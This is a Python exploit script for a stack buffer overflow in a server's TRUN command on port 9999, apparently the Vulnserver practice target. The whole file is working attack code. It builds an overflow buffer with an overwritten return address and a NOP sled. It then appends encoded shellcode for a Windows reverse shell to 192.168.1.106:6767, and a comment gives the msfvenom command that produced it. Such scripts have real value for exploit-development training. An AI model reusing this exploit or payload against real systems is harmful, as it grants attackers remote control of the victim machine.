#!/usr/bin/python

import socket
import os
import sys

host="192.168.1.104"
port=9999

# bad: \x00
#  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=6767 --platform windows -a x86 -e x86/shikata_ga_nai -b '\x00' -f python -v shellcode

shellcode =  ""
shellcode += "\xdb\xd5\xd9\x74\x24\xf4\xb8\x19\xf2\x1e\x37\x5e"
shellcode += "\x2b\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\xdf"
shellcode += "\xf6\xfc\xc2\x23\x1e\x82\x2d\xdb\xdf\xe3\xa4\x3e"
shellcode += "\xee\x23\xd2\x4b\x41\x94\x90\x19\x6e\x5f\xf4\x89"
shellcode += "\xe5\x2d\xd1\xbe\x4e\x9b\x07\xf1\x4f\xb0\x74\x90"
shellcode += "\xd3\xcb\xa8\x72\xed\x03\xbd\x73\x2a\x79\x4c\x21"
shellcode += "\xe3\xf5\xe3\xd5\x80\x40\x38\x5e\xda\x45\x38\x83"
shellcode += "\xab\x64\x69\x12\xa7\x3e\xa9\x95\x64\x4b\xe0\x8d"
shellcode += "\x69\x76\xba\x26\x59\x0c\x3d\xee\x93\xed\x92\xcf"
shellcode += "\x1b\x1c\xea\x08\x9b\xff\x99\x60\xdf\x82\x99\xb7"
shellcode += "\x9d\x58\x2f\x23\x05\x2a\x97\x8f\xb7\xff\x4e\x44"
shellcode += "\xbb\xb4\x05\x02\xd8\x4b\xc9\x39\xe4\xc0\xec\xed"
shellcode += "\x6c\x92\xca\x29\x34\x40\x72\x68\x90\x27\x8b\x6a"
shellcode += "\x7b\x97\x29\xe1\x96\xcc\x43\xa8\xfe\x21\x6e\x52"
shellcode += "\xff\x2d\xf9\x21\xcd\xf2\x51\xad\x7d\x7a\x7c\x2a"
shellcode += "\x81\x51\x38\xa4\x7c\x5a\x39\xed\xba\x0e\x69\x85"
shellcode += "\x6b\x2f\xe2\x55\x93\xfa\xa5\x05\x3b\x55\x06\xf5"
shellcode += "\xfb\x05\xee\x1f\xf4\x7a\x0e\x20\xde\x12\xa5\xdb"
shellcode += "\x89\xdc\x92\xe2\x23\xb5\xe0\xe4\xa9\x2a\x6c\x02"
shellcode += "\xa7\xa4\x38\x9d\x50\x5c\x61\x55\xc0\xa1\xbf\x10"
shellcode += "\xc2\x2a\x4c\xe5\x8d\xda\x39\xf5\x7a\x2b\x74\xa7"
shellcode += "\x2d\x34\xa2\xcf\xb2\xa7\x29\x0f\xbc\xdb\xe5\x58"
shellcode += "\xe9\x2a\xfc\x0c\x07\x14\x56\x32\xda\xc0\x91\xf6"
shellcode += "\x01\x31\x1f\xf7\xc4\x0d\x3b\xe7\x10\x8d\x07\x53"
shellcode += "\xcd\xd8\xd1\x0d\xab\xb2\x93\xe7\x65\x68\x7a\x6f"
shellcode += "\xf3\x42\xbd\xe9\xfc\x8e\x4b\x15\x4c\x67\x0a\x2a"
shellcode += "\x61\xef\x9a\x53\x9f\x8f\x65\x8e\x1b\xbf\x2f\x92"
shellcode += "\x0a\x28\xf6\x47\x0f\x35\x09\xb2\x4c\x40\x8a\x36"
shellcode += "\x2d\xb7\x92\x33\x28\xf3\x14\xa8\x40\x6c\xf1\xce"
shellcode += "\xf7\x8d\xd0"

buffer = "TRUN /.:/" + "A" * 2003
# eip: 77E9F8F7
buffer += "\xF7\xF8\xE9\x77"
buffer += "\x90" * 30
buffer += shellcode

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, port))
        s.send(buffer)
        s.close()

except:
        print '\nCannot connect to the server!'
